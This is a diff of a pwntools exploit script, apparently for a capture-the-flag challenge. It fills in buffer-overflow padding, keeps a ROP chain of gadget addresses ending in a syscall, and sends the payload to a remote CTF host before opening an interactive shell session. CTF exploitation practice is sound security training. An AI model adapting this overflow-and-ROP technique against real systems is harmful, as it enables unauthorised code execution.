@@ -1,8 +1,7 @@
 from pwn import * 
 from struct import pack
 
-# Padding goes here
-p = b''
+p = b'A' * 0x20 + b'B' * 300
 
 p += pack('<Q', 0x0000000000410713) # pop rsi ; ret
 p += pack('<Q', 0x00000000006ba0e0) # @ .data
@@ -80,13 +79,14 @@ p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
 p += pack('<Q', 0x000000000040132c) # syscall
-#print len(p)
-#print(p)
+
+with open("payload", "wb") as f:
+    f.write(p)
+
 context(arch = 'i386', os = 'linux')
-#r = process('./ec')
 r = remote('ctf.adl.tw', 11006)
-# EXPLOIT CODE GOES HERE
-#r.recvline()
+r.send(b"abc")
+print(r.recvuntil(b"Could u help me find my children?\n"))
 r.send(p)
-r.recvline()
+print(r.recvline())
 r.interactive()
